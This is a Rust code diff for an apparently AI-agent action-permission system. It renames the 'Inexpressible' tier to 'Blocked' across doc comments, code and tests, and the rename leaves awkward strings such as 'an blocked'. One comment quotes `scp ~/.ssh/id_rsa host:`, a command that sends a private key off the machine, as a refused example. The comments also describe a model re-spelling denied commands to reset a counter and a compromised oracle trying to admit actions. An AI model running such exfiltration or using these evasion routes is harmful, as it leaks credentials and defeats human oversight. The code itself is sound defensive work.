@@ -393,7 +393,7 @@ pub struct ModelBrief {
     /// Evidence for the decision, never a substitute for it — the render says so
     /// in the same breath, and nothing in the admit path reads this field: the
     /// tier is layer A's, and history cannot promote out of `AlwaysAsk` or
-    /// `Inexpressible` for the same reason a glob cannot (§4f).
+    /// `Blocked` for the same reason a glob cannot (§4f).
     pub prior: Vec<crate::adjudicate::PriorAnswer>,
     /// Present only when layer A found the action adjudicable AND resolved. The
     /// oracle takes it by value to build a [`Widening`]; there is no other source.
@@ -1092,7 +1092,7 @@ where
 ///    `scp ~/.ssh/id_rsa host:` are the same *intention* and different directions,
 ///    because the second reaches `external`. A model re-spelling across that boundary
 ///    resets its counter. Mitigated rather than solved: both are
-///    [`Tier::Inexpressible`], so both are refused by layer A without an adjudicator
+///    [`Tier::Blocked`], so both are refused by layer A without an adjudicator
 ///    to argue with, and the breaker was never the mechanism protecting that case.
 /// 3. **The intent set is as good as the program table.** An unknown program yields
 ///    `{Unknown}`, so every denied unknown program is one direction with every other.
@@ -1648,7 +1648,7 @@ impl Adjudicator for Budgeted {
 ///
 /// 1. **The action did not resolve** → `Unavailable`. The oracle is not consulted;
 ///    there is nothing to consult it about.
-/// 2. **The tier is inexpressible** → `Denied`. Layer A decided; nothing promotes it.
+/// 2. **The tier is blocked** → `Denied`. Layer A decided; nothing promotes it.
 /// 3. **The tier is always-ask** → escalate to a human. The oracle is not consulted at
 ///    all, because the point of the fixed list is that no amount of model confidence
 ///    substitutes for the operator. There is no code path from here to `Admit`, and
@@ -1816,7 +1816,7 @@ impl Adjudicator for ModelAdjudicator {
                 latency_ms: started.elapsed().as_millis() as u64,
             }, false, "ask", Vec::new());
         }
-        if let Tier::Inexpressible { rule, evidence } = &req.tier {
+        if let Tier::Blocked { rule, evidence } = &req.tier {
             return self.note(AdjudicationDecision {
                 request_id: req.id.clone(),
                 outcome: DecisionOutcome::Selected {
@@ -2285,7 +2285,7 @@ mod tests {
     }
 
     #[test]
-    fn a_compromised_oracle_cannot_admit_an_inexpressible_action() {
+    fn a_compromised_oracle_cannot_admit_an_blocked_action() {
         // The oracle here says yes to everything it possibly can. It still cannot
         // admit this, because the value it would need does not exist for it — and
         // that is a fact about the types, not about this oracle's manners.
@@ -2316,7 +2316,7 @@ mod tests {
                     d.basis
                 );
             }
-            o => panic!("an inexpressible action is denied by layer A, got {o:?}"),
+            o => panic!("an blocked action is denied by layer A, got {o:?}"),
         }
     }
 
